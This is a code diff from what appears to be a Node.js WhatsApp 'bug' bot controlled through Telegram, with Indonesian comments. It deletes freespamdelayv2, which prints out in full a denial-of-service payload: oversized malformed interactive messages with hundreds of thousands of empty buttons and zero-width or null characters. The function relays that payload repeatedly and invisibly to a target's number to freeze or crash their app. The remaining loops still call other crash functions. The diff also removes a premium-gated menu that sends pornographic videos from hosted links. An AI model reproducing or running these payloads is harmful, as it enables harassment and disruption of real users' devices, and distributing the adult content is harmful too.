@@ -3893,156 +3893,6 @@ async function freespamdelay(target) {
         }
     }
 }
-
-async function freespamdelayv2(target) {
-    const participant = { jid: target };
-
-    const buildMessage = (content) => ({
-        groupStatusMessageV2: {
-            message: {
-                ...content,
-                messageContextInfo: {
-                    deviceListMetadata: {},
-                    deviceListMetadataVersion: 2
-                }
-            }
-        }
-    });
-
-    const a = buildMessage({
-        interactiveResponseMessage: {
-            body: {
-                text: " - zephyrinē tukang maling ",
-                footer: "\u0250"
-            },
-            nativeFlowMessage: {
-                buttons: "x".repeat(40000),
-                nativeFlowResponseMessage: {
-                    buttons: Array.from({ length: 1236 }, () => ({}))
-                }
-            },
-            nativeFlowInfo: {
-                name: "single_select",
-                paramsJson: JSON.stringify({
-                    icon: "document",
-                    title: " - zephyrinē tukang maling ",
-                    sections: Array.from({ length: 5055 }, () => ({}))
-                })
-            }
-        }
-    });
-
-    const b = buildMessage({
-        interactiveMessage: {
-            header: {
-                title: " - zephyrinē tukang maling "
-            },
-            body: {
-                text: "[{".repeat(1000) + "}]".repeat(1000)
-            },
-            nativeFlowMessage: {
-                buttons: Array.from({ length: 500000 }, () => ({}))
-            }
-        }
-    });
-
-    const c = buildMessage({
-        interactiveMessage: {
-            body: {
-                text: "\u0000".repeat(30000) + "\u3164".repeat(30000) + "\uFDFD".repeat(30000)
-            },
-            messageParamsJson: "\uFDFD".repeat(50000),
-            contextInfo: {
-                mentionedJid: Array.from({ length: 1000 }, function() {
-                    return Math.floor(Math.random() * 100000) + "@s.whatsapp.net";
-                }),
-                isForwarded: true,
-                forwardingScore: 9999
-            }
-        }
-    });
-
-    const d = buildMessage({
-        interactiveResponseMessage: {
-            body: {
-                text: " - zephyrinē tukang maling ",
-                format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-                name: "catalog_message",
-                paramsJson: "\u200B".repeat(1045000),
-                version: 3
-            }
-        }
-    });
-
-    const e = buildMessage({
-        interactiveMessage: {
-            body: {
-                text: " - zephyrinē tukang maling "
-            },
-            nativeFlowMessage: {
-                buttons: "\x10".repeat(200000)
-            }
-        }
-    });
-
-    const f = buildMessage({
-        interactiveMessage: {
-            body: {
-                text: " - zephyrinē tukang maling "
-            },
-            nativeFlowMessage: {
-                buttons: Array.from({ length: 500000 }, () => ({}))
-            }
-        }
-    });
-
-    const g = buildMessage({
-        interactiveMessage: {
-            body: {
-                text: " - zephyrinē tukang maling "
-            },
-            nativeFlowMessage: {
-                buttons: Array.from({ length: 100000 }, () => ({}))
-            }
-        }
-    });
-
-    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
-    // Opsi relayMessage supaya pesan benar-benar invisible di sender
-    const relayOpts = {
-        participant,
-        noSelfSync: true,
-        additionalNodes: [
-            {
-                tag: "biz",
-                attrs: {},
-                content: [
-                    {
-                        tag: "interactive",
-                        attrs: { type: "native_flow", v: "1" },
-                        content: undefined
-                    }
-                ]
-            }
-        ],
-        useCachedGroupMetadata: false
-    };
-
-    const messages = [a, b, c, d, e, f, g];
-
-    for (let i = 0; i < 30; i++) {
-        for (const msg of messages) {
-            await sock.relayMessage(target, msg, relayOpts);
-        }
-
-        if ((i + 1) % 5 === 0) {
-            await delay(3000);
-        }
-    }
-}
 //=========== ASYNC FUNCTION SEND ==========\\
 async function crayxkouta(target) {
 for (let i = 0; i < 50; i++) {
@@ -4107,39 +3957,15 @@ console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
 async function crayxsuper(target) {
 for (let i = 0; i < 70; i++) {
 await freezeinvis(target)
-await freespamdelayv2(target)
-await freezeinvis(target)
-await freespamdelayv2(target)
-await freezeinvis(target)
-await freespamdelayv2(target)
-await freezeinvis(target)
-await freespamdelayv2(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freespamdelayv2(target)
-await freespamdelayv2(target)
 await freezeinvis(target)
 await freezeinvis(target)
 await freezeinvis(target)
 await freezeinvis(target)
-await freespamdelayv2(target)
-await freezeinvis(target)
-await freespamdelayv2(target)
-await freezeinvis(target)
-await freespamdelayv2(target)
-await freezeinvis(target)
-await freespamdelayv2(target)
-await freezeinvis(target)
-await freespamdelayv2(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freespamdelayv2(target)
-await freespamdelayv2(target)
 await freezeinvis(target)
 await freezeinvis(target)
 await freezeinvis(target)
 await freezeinvis(target)
-await freespamdelayv2(target)
+await freezeinvis(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 }
@@ -4153,10 +3979,6 @@ await freezeinvis(target)
 await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
-await freespamdelayv2(target)
-await freespamdelayv2(target)
-await freespamdelayv2(target)
-await freespamdelayv2(target)
 await freezeinvis(target)
 await ForcloseDOC(target)
 await freezeinvis(target)
@@ -4173,13 +3995,9 @@ async function Crayxbayar(target) {
 for (let i = 0; i < 50; i++) {
 await freezeinvis(target)
 await freezeinvis(target)
-await freespamdelayv2(target)
-await freespamdelayv2(target)
 await freezeinvis(target)
 await freezeinvis(target)
 await freezeinvis(target)
-await freespamdelayv2(target)
-await freespamdelayv2(target)
 await freezeinvis(target)
 await freezeinvis(target)
 await freezeinvis(target)
@@ -5718,136 +5536,6 @@ const chatId = msg.chat.id;
 const response = setCooldown(match[1]);
 
 bot.sendMessage(chatId, response); });
-
-// ============================================
-//   BOKEP MENU — node-telegram-bot-api
-// ============================================
-
-// ==== COMMAND /bokep ====
-bot.onText(/^\/bokep$/, async (msg) => {
-  const chatId   = msg.chat.id;
-  const senderId = msg.from.id;
-
-  // Cek premium
-  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
-    return bot.sendMessage(chatId, "❌ Khusus user premium atau grup premium.");
-  }
-
-  // Hapus pesan command user
-  try { await bot.deleteMessage(chatId, msg.message_id); } catch {}
-
-  const mainMenuMessage = `\`\`\`
-JANGAN COKLI AJA BG
-\`\`\``;
-
-  const mainKeyboard = {
-    inline_keyboard: [
-      [
-        { text: "🔚 𝙱𝙰𝙲𝙺 𝙼𝙴𝙽𝚄",  callback_data: "main_menu" },
-        { text: "🔄 𝙽𝙴𝚇𝚃 𝙼𝙴𝙽𝚄",  callback_data: "bokep11"   }
-      ]
-    ]
-  };
-
-  await bot.sendVideo(chatId, "https://files.catbox.moe/h1himg.mp4", {
-    caption: mainMenuMessage,
-    parse_mode: "Markdown",
-    reply_markup: mainKeyboard
-  });
-});
-
-// ==== CALLBACK HANDLER ====
-bot.on("callback_query", async (query) => {
-  const chatId    = query.message.chat.id;
-  const messageId = query.message.message_id;
-  const senderId  = query.from.id;
-  const data      = query.data;
-
-  // Cek premium
-  if (!hasPremiumAccess(senderId, chatId, query.message.chat.type)) {
-    return bot.answerCallbackQuery(query.id, {
-      text: "❌ Khusus user premium!",
-      show_alert: true
-    });
-  }
-
-  // =========================
-  //   BOKEP11
-  // =========================
-  if (data === "bokep11") {
-    await bot.deleteMessage(chatId, messageId).catch(() => {});
-    await bot.answerCallbackQuery(query.id);
-
-    const mainMenuMessage = `\`\`\`
-JANGAN COKLI AJA BG
-\`\`\``;
-    const mainKeyboard = {
-      inline_keyboard: [
-        [
-          { text: "🔚 𝙱𝙰𝙲𝙺 𝙼𝙴𝙽𝚄",  callback_data: "main_menu" },
-          { text: "🔄 𝙽𝙴𝚇𝚃 𝙼𝙴𝙽𝚄",  callback_data: "bokep2"    }
-        ]
-      ]
-    };
-
-    return bot.sendVideo(chatId, "https://files.catbox.moe/pocidu.mp4", {
-      caption: mainMenuMessage,
-      parse_mode: "Markdown",
-      reply_markup: mainKeyboard
-    });
-  }
-
-  // =========================
-  //   BOKEP2
-  // =========================
-  if (data === "bokep2") {
-    await bot.deleteMessage(chatId, messageId).catch(() => {});
-    await bot.answerCallbackQuery(query.id);
-
-    const mainMenuMessage = `\`\`\`
-JANGAN COKLI AJA BG
-\`\`\``;
-    const mainKeyboard = {
-      inline_keyboard: [
-        [
-          { text: "🔚 𝙱𝙰𝙲𝙺 𝙼𝙴𝙽𝚄",  callback_data: "developercmd" },
-          { text: "🔄 𝙽𝙴𝚇𝚃 𝙼𝙴𝙽𝚄",  callback_data: "bokep22"      }
-        ]
-      ]
-    };
-
-    return bot.sendVideo(chatId, "https://files.catbox.moe/03d1i3.mp4", {
-      caption: mainMenuMessage,
-      parse_mode: "Markdown",
-      reply_markup: mainKeyboard
-    });
-  }
-
-  // =========================
-  //   BOKEP22
-  // =========================
-  if (data === "bokep22") {
-    await bot.deleteMessage(chatId, messageId).catch(() => {});
-    await bot.answerCallbackQuery(query.id);
-
-    const mainMenuMessage = `\`\`\`
-JANGAN COKLI AJA BG
-\`\`\``;
-    const mainKeyboard = {
-      inline_keyboard: [
-        [
-          { text: "🔚 𝙱𝙰𝙲𝙺 𝙼𝙴𝙽𝚄", callback_data: "main_menu" }
-        ]
-      ]
-    };
-
-    return bot.sendVideo(chatId, "https://files.catbox.moe/i5956l.mp4", {
-      caption: mainMenuMessage,
-      parse_mode: "Markdown",
-      reply_markup: mainKeyboard
-    });
-  }
-});
 //=========FUNCTION BUG SPAM==========\\
 
 // ============================================
